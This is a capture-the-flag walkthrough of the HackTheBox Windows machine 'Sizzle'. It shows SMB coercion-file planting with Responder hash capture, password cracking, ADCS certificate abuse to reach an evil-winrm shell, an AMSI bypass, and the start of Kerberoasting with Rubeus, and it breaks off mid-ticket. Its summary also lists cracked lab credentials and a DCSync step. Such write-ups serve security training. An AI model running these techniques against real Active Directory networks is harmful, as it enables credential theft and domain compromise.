---
layout: ctf
title: "HackTheBox: Sizzle"
platform: "HackTheBox"
type: "Machine"
difficulty: "Insane"
image: "/assets/img/ctf/sizzle.png"
tags: [Windows, Active-Directory, SMB-Abuse, Coerced-Authentication, SCF-Abuse, Responder, Password-Cracking, ADCS, Certificate-Enrollment, Evil-WinRM, AMSI-Bypass, Constrained-Language-Mode, Kerberoasting, Rubeus, BloodHound, DCSync, Mimikatz, Pass-the-Hash]
date: 2026-06-18
---

# 🎯 Sizzle

**OS:** Windows | **Difficulty:** Insane | **IP:** `10.129.23.236`

![sizzle.htb](/assets/img/ctf/data/sizzle-htb.png)

---

## ⛓️ TL;DR / Attack Chain

1. **Foothold:** Enumerated SMB anonymously and found write access to `/ZZ_ARCHIVE` and `/Users/Public`. Dropped malicious shortcut/SCF files to coerce authentication, captured `amanda`'s NTLMv2 hash with Responder, and cracked it (`Ashare1972`).
2. **Initial Access via ADCS:** WinRM blocked password logins (401 error). Logged into ADCS web enrollment (`/certsrv`) as `amanda`, generated a CSR via OpenSSL, signed a user certificate, and used it with `evil-winrm --ssl` to pop a shell.
3. **Lateral Movement (`amanda` to `mrlky`):** Bypassed AMSI/Constrained Language Mode using `PowerLess.exe`. Found that `mrlky` had an SPN (`http/sizzle`), Kerberoasted the account with `Rubeus.exe`, and cracked the hash (`Football#7`). Logged back into ADCS via an incognito tab to generate a certificate for `mrlky` and spawn a new shell.
4. **PrivEsc:** Ran `SharpHound` and found that `mrlky` possessed DCSync rights (`GetChangesAll`, `GetChanges`) over the `HTB.LOCAL` domain. Executed a DCSync attack using an obfuscated Mimikatz to dump the Administrator NTLM hash and got a system shell via `impacket-wmiexec`.

---

## 🔑 Loot & Creds

| User | Credential | Where / How |
| --- | --- | --- |
| **amanda** | `Ashare1972` | Coerced NTLMv2 authentication via SCF/URL files on writable share, cracked with rockyou. |
| **mrlky** | `Football#7` | Kerberoasting because the account had an SPN set, cracked with rockyou. |
| **Administrator** | `f6b7160bfc91823792e0ac3a162c9267` | DCSync attack executed via obfuscated Mimikatz as `mrlky`. |

---

## 🔧 0. Setup & Global Variables
*Run this in your terminal once so you can copy-paste the rest of the commands blindly.*

```bash
$ IP="10.129.23.236" ; DOMAIN="sizzle.htb" && \
  # sudo timedatectl set-ntp off && \ # this in case ntpdate's work is reset automatically
  sudo ntpdate $DOMAIN ;
  echo "$IP $DOMAIN" | sudo tee -a /etc/hosts
```

---

## 🔍 1. Enumeration

### Nmap
```bash
$ mkdir -p nmap && nmap -sV -sC -p- $IP -oA ./nmap/nmap
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-17 12:17 +0200
Nmap scan report for sizzle.htb (10.129.23.236)
Host is up (0.028s latency).
Not shown: 65507 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2026-06-17T10:21:35+00:00; 0s from scanner time.
443/tcp   open  ssl/https?
|_ssl-date: 2026-06-17T10:21:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
| tls-alpn:
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-17T10:21:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2026-06-17T10:21:35+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-17T10:21:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/wsmans?
| tls-alpn:
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2026-06-17T10:21:35+00:00; 0s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-06-17T10:20:32
|_  start_date: 2026-06-17T10:14:38

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 253.83 seconds
```

### SMB

Using [EnumSMB](https://github.com/tralsesec/EnumSMB) we find out the following:

```
$ enum-smb -i $IP -l 10.10.14.127 -m enum

  _____                       ____  __  __ ____
 | ____|_ __  _   _ _ __ ___ / ___||  \/  | __ )
 |  _| | '_ \| | | | '_ ` _ \\___ \| |\/| |  _ \
 | |___| | | | |_| | | | | | |___) | |  | | |_) |
 |_____|_| |_|\__,_|_| |_| |_|____/|_|  |_|____/  v1.2
                     https://github.com/tralsesec/EnumSMB

==========================================================
[*] Targeting //10.129.23.236 as 'guest' [Mode: enum]
==========================================================
[NO ACCESS]  /ADMIN$
[NO ACCESS]  /C$
[NO ACCESS]  /CertEnroll
[READ]       /Department Shares/Accounting
[READ]       /Department Shares/Audit
[READ]       /Department Shares/Banking
[READ]       /Department Shares/CEO_protected
[READ]       /Department Shares/Devops
[READ]       /Department Shares/Finance
[READ]       /Department Shares/HR
[READ]       /Department Shares/Infosec
[READ]       /Department Shares/Infrastructure
[READ]       /Department Shares/IT
[READ]       /Department Shares/Legal
[READ]       /Department Shares/M&A
[READ]       /Department Shares/Marketing
[READ]       /Department Shares/R&D
[READ]       /Department Shares/Sales
[READ]       /Department Shares/Security
[READ]       /Department Shares/Tax
[READ]       /Department Shares/Users
[READ/WRITE] /Department Shares/ZZ_ARCHIVE
[READ]       /Department Shares/Banking/Offshore
[READ]       /Department Shares/HR/Benefits
[READ]       /Department Shares/HR/Corporate Events
[READ]       /Department Shares/HR/New Hire Documents
[READ]       /Department Shares/HR/Payroll
[READ]       /Department Shares/HR/Policies
[READ]       /Department Shares/Tax/2010
[READ]       /Department Shares/Tax/2011
[READ]       /Department Shares/Tax/2012
[READ]       /Department Shares/Tax/2013
[READ]       /Department Shares/Tax/2014
[READ]       /Department Shares/Tax/2015
[READ]       /Department Shares/Tax/2016
[READ]       /Department Shares/Tax/2017
[READ]       /Department Shares/Tax/2018
[READ]       /Department Shares/Users/amanda
[READ]       /Department Shares/Users/amanda_adm
[READ]       /Department Shares/Users/bill
[READ]       /Department Shares/Users/bob
[READ]       /Department Shares/Users/chris
[READ]       /Department Shares/Users/henry
[READ]       /Department Shares/Users/joe
[READ]       /Department Shares/Users/jose
[READ]       /Department Shares/Users/lkys37en
[READ]       /Department Shares/Users/morgan
[READ]       /Department Shares/Users/mrb3n
[READ/WRITE] /Department Shares/Users/Public
[READ]       /Department Shares/Banking/Offshore/Clients
[READ]       /Department Shares/Banking/Offshore/Data
[READ]       /Department Shares/Banking/Offshore/Dev
[READ]       /Department Shares/Banking/Offshore/Plans
[READ]       /Department Shares/Banking/Offshore/Sites
[NO ACCESS]  /NETLOGON
[NO ACCESS]  /Operations
[NO ACCESS]  /SYSVOL
```

As we can write to two different shares, let's try to coerce any client into authentication to capture their hash and crack it.

1. In another terminal, start `responder`:

    ```bash
    $ sudo responder -I tun0
    ```

2. Run:

    ```
    $ enum-smb -i $IP -l <YOUR IP> -m write

      _____                       ____  __  __ ____
    | ____|_ __  _   _ _ __ ___ / ___||  \/  | __ )
    |  _| | '_ \| | | | '_ ` _ \\___ \| |\/| |  _ \
    | |___| | | | |_| | | | | | |___) | |  | | |_) |
    |_____|_| |_|\__,_|_| |_| |_|____/|_|  |_|____/  v1.1
                        https://github.com/tralsesec/EnumSMB

    ==========================================================
    [*] Targeting //10.129.23.236 as 'guest' [Mode: write]
    ==========================================================
    [UPLOADED]   /Department Shares/ZZ_ARCHIVE/.background-image.url
    [UPLOADED]   /Department Shares/ZZ_ARCHIVE/.background-image.scf
    [UPLOADED]   /Department Shares/ZZ_ARCHIVE/.background-image.library-ms
    [UPLOADED]   /Department Shares/ZZ_ARCHIVE/.background-image.search-ms
    [UPLOADED]   /Department Shares/ZZ_ARCHIVE/.background-image.searchConnector-ms
    [UPLOADED]   /Department Shares/ZZ_ARCHIVE/.background-image.search
    [UPLOADED]   /Department Shares/Users/Public/.background-image.url
    [UPLOADED]   /Department Shares/Users/Public/.background-image.scf
    [UPLOADED]   /Department Shares/Users/Public/.background-image.library-ms
    [UPLOADED]   /Department Shares/Users/Public/.background-image.search-ms
    [UPLOADED]   /Department Shares/Users/Public/.background-image.searchConnector-ms
    [UPLOADED]   /Department Shares/Users/Public/.background-image.search
    ```

3. Now wait...

    ```bash
    [SMB] NTLMv2-SSP Client   : 10.129.23.236
    [SMB] NTLMv2-SSP Username : HTB\amanda
    [SMB] NTLMv2-SSP Hash     : amanda::HTB:41e1371a42bb0cd5:E10E65892DA23F34E8538EE20A38EF60:010100000000000000DD312E54FEDC0121A09099F9995E9900000000020008005100330047005A0001001E00570049004E002D0044005A00500030005A0047005A00300055004500300004003400570049004E002D0044005A00500030005A0047005A0030005500450030002E005100330047005A002E004C004F00430041004C00030014005100330047005A002E004C004F00430041004C00050014005100330047005A002E004C004F00430041004C000700080000DD312E54FEDC0106000400020000000800300030000000000000000100000000200000177C57F912794A55D17165C810D8F636A0582976D2F218D335697EB3ADA78A530A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310032003700000000000000000000000000
    ```

    ![sizzle-1.htb](/assets/img/ctf/data/sizzle-1.png)

Here we go!

---

## 🚪 2. Initial Foothold

In order to crack the hash, we can do the following:

```bash
$ echo 'amanda::HTB:41e1371a42bb0cd5:E10E65892DA23F34E8538EE20A38EF60:010100000000000000DD312E54FEDC0121A09099F9995E9900000000020008005100330047005A0001001E00570049004E002D0044005A00500030005A0047005A00300055004500300004003400570049004E002D0044005A00500030005A0047005A0030005500450030002E005100330047005A002E004C004F00430041004C00030014005100330047005A002E004C004F00430041004C00050014005100330047005A002E004C004F00430041004C000700080000DD312E54FEDC0106000400020000000800300030000000000000000100000000200000177C57F912794A55D17165C810D8F636A0582976D2F218D335697EB3ADA78A530A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310032003700000000000000000000000000' > amanda

$ john --wordlist=/usr/share/wordlists/rockyou.txt amanda
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ashare1972       (amanda)
1g 0:00:00:03 DONE (2026-06-17 14:49) 0.2754g/s 3145Kp/s 3145Kc/s 3145KC/s Ashiah08..AorAir2531
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Cracked hash: `amanda` : `Ashare1972`.

Re-enumerating SMB with new credentials:

```
$ enum-smb -i $IP -m enum -u amanda -p Ashare1972

  _____                       ____  __  __ ____
 | ____|_ __  _   _ _ __ ___ / ___||  \/  | __ )
 |  _| | '_ \| | | | '_ ` _ \\___ \| |\/| |  _ \
 | |___| | | | |_| | | | | | |___) | |  | | |_) |
 |_____|_| |_|\__,_|_| |_| |_|____/|_|  |_|____/  v1.2
                     https://github.com/tralsesec/EnumSMB

==========================================================
[*] Targeting //10.129.23.236 as 'amanda' [Mode: enum]
==========================================================
[NO ACCESS]  /ADMIN$
[NO ACCESS]  /C$
[READ]       /Department Shares/Accounting
[READ]       /Department Shares/Audit
[READ]       /Department Shares/Banking
[READ]       /Department Shares/CEO_protected
[READ]       /Department Shares/Devops
[READ]       /Department Shares/Finance
[READ]       /Department Shares/HR
[READ]       /Department Shares/Infosec
[READ]       /Department Shares/Infrastructure
[READ]       /Department Shares/IT
[READ]       /Department Shares/Legal
[READ]       /Department Shares/M&A
[READ]       /Department Shares/Marketing
[READ]       /Department Shares/R&D
[READ]       /Department Shares/Sales
[READ]       /Department Shares/Security
[READ]       /Department Shares/Tax
[READ]       /Department Shares/Users
[READ/WRITE] /Department Shares/ZZ_ARCHIVE
[READ]       /Department Shares/Banking/Offshore
[READ]       /Department Shares/HR/Benefits
[READ]       /Department Shares/HR/Corporate Events
[READ]       /Department Shares/HR/New Hire Documents
[READ]       /Department Shares/HR/Payroll
[READ]       /Department Shares/HR/Policies
[READ]       /Department Shares/Tax/2010
[READ]       /Department Shares/Tax/2011
[READ]       /Department Shares/Tax/2012
[READ]       /Department Shares/Tax/2013
[READ]       /Department Shares/Tax/2014
[READ]       /Department Shares/Tax/2015
[READ]       /Department Shares/Tax/2016
[READ]       /Department Shares/Tax/2017
[READ]       /Department Shares/Tax/2018
[READ]       /Department Shares/Users/amanda
[READ]       /Department Shares/Users/amanda_adm
[READ]       /Department Shares/Users/bill
[READ]       /Department Shares/Users/bob
[READ]       /Department Shares/Users/chris
[READ]       /Department Shares/Users/henry
[READ]       /Department Shares/Users/joe
[READ]       /Department Shares/Users/jose
[READ]       /Department Shares/Users/lkys37en
[READ]       /Department Shares/Users/morgan
[READ]       /Department Shares/Users/mrb3n
[READ/WRITE] /Department Shares/Users/Public
[READ]       /Department Shares/Banking/Offshore/Clients
[READ]       /Department Shares/Banking/Offshore/Data
[READ]       /Department Shares/Banking/Offshore/Dev
[READ]       /Department Shares/Banking/Offshore/Plans
[READ]       /Department Shares/Banking/Offshore/Sites
[NO ACCESS]  /Operations
[READ]       /SYSVOL/HTB.LOCAL
[READ]       /SYSVOL/HTB.LOCAL/DfsrPrivate
[READ]       /SYSVOL/HTB.LOCAL/Policies
[READ]       /SYSVOL/HTB.LOCAL/scripts
[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}
[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}
[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE
[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER
[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE
[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER
[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Applications
[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft
[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts
[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Applications
[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft
[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Scripts
[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER/Documents & Settings
[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER/Scripts
[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT
[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Shutdown
[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Startup
[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT
[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Scripts/Shutdown
[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Scripts/Startup
[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER/Scripts/Logoff
[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER/Scripts/Logon
[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
```

We can try to log in via WinRM:

```bash
$ evil-winrm -i $IP -u amanda -p Ashare1972

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint


Error: Connection timeout or error occurred: WinRM::WinRMHTTPTransportError - Unable to parse authorization header. Headers: {"Server"=>"Microsoft-HTTPAPI/2.0", "Date"=>"Wed, 17 Jun 2026 14:00:25 GMT", "Connection"=>"close", "Content-Length"=>"0"}
Body:  (401).

Warning: Cleaning up and exiting...
```

For some reason it won't authenticate. Probably it requires a certificate. As we saw the `CertEntroll` share before, probably ADCS over HTTP is enabled. Let's try hit `http://sizzle.htb/CERTSRV` and log in as `amanda`:

![sizzle-2.htb](/assets/img/ctf/data/sizzle-2.png)

Credentials worked. Let's issue a certificate to use it for WinRM:

![sizzle-3.htb](/assets/img/ctf/data/sizzle-3.png)

In order to issue a certificate we need a certificate signing request (CSR). We can create one with `openssl`:

```bash
$ openssl genrsa -des3 -out amanda.key 2048 && \
  openssl req -new -key amanda.key -out amanda.csr
Enter PEM pass phrase:<Ashare1972>
Verifying - Enter PEM pass phrase:<Ashare1972>
Enter pass phrase for amanda.key:<Ashare1972>
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:

$ cat amanda.csr
-----BEGIN CERTIFICATE REQUEST-----
MIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
AQEBBQADggEPADCCAQoCggEBAOZA7grOvG6Q1XNDMMM6bm2j6wk1dua7xgcPhBKu
37IwtS2AMpJymDOkIfdrjgIX4HdM4IDmOk45h1vhmn59fiTP4L/h3GhLdSXbFIEA
d/A+Gx58m2uWbN5KjKooJCCA71tUMagk/xvRJJRUbI/x49xlJ7MN3hSm6alS1Im4
3bRGfcG4EOfWuCoBcKLCbn8BxYM2o52MKaLxsaSjDkXtziVB7ksh0ICoC4byNpTm
juLs/eC687DH0SNhHeS65eOZFHXkB5Qza1l151Lta/sMO4z8nh+CDoubM7lmQXsh
SjvX7ZCk+KisULTn3LBKaZS7D0E/iS/XTJZSUfLlqFWHM8cCAwEAAaAAMA0GCSqG
SIb3DQEBCwUAA4IBAQDPN4fkZXX2otC5aCtBJGI0VBwC0bxNTCRY1/qOfeWqUWR5
eueoYxpebLOTJG+0UUFsl7yzVplRD5WH4bryOJ4yBay5/G+lMl40zpGpG1bPRGwp
5IfgXzUR1kdqOGdW5f4S4i8Yin7aiopQZtnSkBYIg2CHd5ss2gpdeRW/u8pTaaL8
dl+rPt3AOe8By/CAjv8ly9ZhvXzLm7J6kgKwN2P3OSHt2Z1HwAatFl3qkzzAMjeM
LmQraN7L42LXXXE9DTYoNkD5VmgBFLIA2J3EDLsdQsaxDcNoSZRkaqGC75384VYS
83qkQSrX7o3lU55aDhTfd524IIzKdSFX98CazQKa
-----END CERTIFICATE REQUEST-----
```

That's the CSR we need. Let's upload it to the web service (and make sure Template `User` is selected):

![sizzle-4.htb](/assets/img/ctf/data/sizzle-4.png)

Select `Base64 Encoded` and download certificate.

```bash
$ evil-winrm -i $IP -u amanda -p Ashare1972 --priv-key ./amanda.key --pub-key ./certnew.cer

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: Useless cert/s provided, SSL is not enabled

Info: Establishing connection to remote endpoint


Error: Connection timeout or error occurred: WinRM::WinRMHTTPTransportError - Unable to parse authorization header. Headers: {"Server"=>"Microsoft-HTTPAPI/2.0", "Date"=>"Wed, 17 Jun 2026 14:10:10 GMT", "Connection"=>"close", "Content-Length"=>"0"}
Body:  (401).

Warning: Cleaning up and exiting...
📦[tralsesec@kali Sizzle]$ evil-winrm -i $IP -u amanda -p Ashare1972 --priv-key ./amanda.key --pub-key ./certnew.cer --ssl

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint
Enter PEM pass phrase:<Ashare1972>
*Evil-WinRM* PS C:\Users\amanda\Documents> whoami
htb\amanda
```

Here we go!

For convinience, run this to decrypt the private key to not use a password:

```bash
$ openssl rsa -in amanda.key -out amanda_decrypted.key
Enter pass phrase for amanda.key:<Ashare1972>
writing RSA key

$ evil-winrm -i $IP -u amanda -p Ashare1972 --priv-key ./amanda_decrypted.key --pub-key ./certnew.cer --ssl
Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\amanda\Documents>
```

---

## 🤸 3. Lateral Movement (`amanda` -> `mrlky`)

In order to bypass AMSI and Contrained Language limitations, [PowerLess](https://github.com/tralsesec/PowerLess) can be used. Make sure to upload both PowerLess and PowerView.ps1 to the target machine to enumerate:

```powershell
*Evil-WinRM* PS C:\Windows\Temp> .\PowerLess.exe 'Import-Module .\PowerView.ps1; Get-DomainUser -PreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof; Get-DomainUser -SPN -Properties samaccountname,memberof,serviceprincipalname; Get-DomainUser -LDAPFilter \"(userAccountControl:1.2.840.113556.1.4.803:=524288)\" -Properties samaccountname,useraccountcontrol,memberof; Get-DomainUser -Properties samaccountname,description | Where-Object { $_.description -ne $null }'

@{serviceprincipalname=kadmin/changepw; memberof=CN=Denied RODC Password Replication Group,CN=Users,DC=HTB,DC=LOCAL; samaccountname=krbtgt}
@{serviceprincipalname=http/sizzle; memberof=System.DirectoryServices.ResultPropertyValueCollection; samaccountname=mrlky}
@{samaccountname=Administrator; description=Built-in account for administering the computer/domain}
@{samaccountname=Guest; description=Built-in account for guest access to the computer/domain}
@{samaccountname=DefaultAccount; description=A user account managed by the system.}
@{samaccountname=krbtgt; description=Key Distribution Center Service Account}
```

As we can see, the user `mrlky` has an SPN (`http/sizzle`), let's kerberoast him. For that we need `Rubeus.exe`:

```powershell
*Evil-WinRM* PS C:\Windows\Temp> .\Rubeus.exe asktgt /user:amanda /domain:htb.local /password:Ashare1972 /outfile:amanda.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 7D0516EA4B6ED084F3FDF71C47D9BEB3
[*] Building AS-REQ (w/ preauth) for: 'htb.local\amanda'
[*] Using domain controller: fe80::b959:fea9:f96:ea91%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIEvDCCBLigAwIBBaEDAgEWooID3DCCA9hhggPUMIID0KADAgEFoQsbCUhUQi5MT0NBTKIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fso4IDmjCCA5agAwIBEqEDAgECooIDiASCA4S+NG5Blrr50jRk
      xLsJ+3iciq4yURsyvBTTqe/O6bE8EnRjPrn7pb18n4nOF96UhFYP4wIV0i2ztt822i/nZ6BoQx3n3eix
      YlvwVvBaXueKPReC2zVay3RCGOmdUZYzXWpulPPAjl7jKh35sKIo7CvYcNaWidkz8m/kgqx3rxS/ABdE
      zuYJAEAE3DPMJffl0/pAzKubuUlqmiNVjsp1OTk2gqgV0vVviBNfxPip1aJWaBi0sMjtqMbUyaV4zBvK
      JWutdfM3r3WqiK439QtYrLFjmCBCtPkkgSmdyas6ens5b6pdZWJcTuXME0P4oYiyMWL4a1yte0AEkyoD
      gg1g+fjVT25ONYKgJ+d46yuFY5rj2N6b+IRwRlLgVbUdfbAwLjYR4lbg1czkTZbho0HUdEIKhkr37b2y
      1DAD7Q1NNxLHm0CtFJHZOcs3VpP4/5oOFFT5WLh+ZpsTX2RxCOy1KnIxx3jgTVtS1ltX2RjhFs301OGR
      nmYO6mKOxasgmQPucEF1JUUWvQ5bRrbbrXqwzMj74OXBrmSTRvcKzik5ePF0/Z4MTjhZxlJnwYegWgHm
      RTdYYt3NzWfPJYa927qMKWoaEhq6Y9gr+zCDSr++HSm1EbhUsYl2rCVVkQwrv/B9gaZahwyT2hbBUp95
      wADQlgp+Ah2Ii6vufDwi4obUA60szbPQan1e+FLp+GgGEeTDsTGHSSJYgqfzG5FMf0nKoiHe1bJB2tWl
      fRmlCWgREqSRu3v8riuo5tAl4QqSPuCGnWUJzinAzdarO2Qs42oJ7FigSxaoNhCnF5iFmkF/Ao3K/D16
      duAMbifstwHuuPfzNpggnA0D64eE0Li+LaMJ9hgrhO6U+B2/6AkZ/oZhBeZtK1q2Wgx4ULV8enQRSOqW
      HWKEUT50XC82i41x6fpdxF0sIIizws0ZrQ5ZExWRDbmR4vzM4CLo1QtfnAiZj+bkjQpaLYSU/OTMeb8Q
      KWKWodIWsE2PJecM8Jw6Y+bGw34bRmdttkOVhbqK6eLzCDHa1uiub6+p2uAsHo0yUstNG711+3jlc3VE
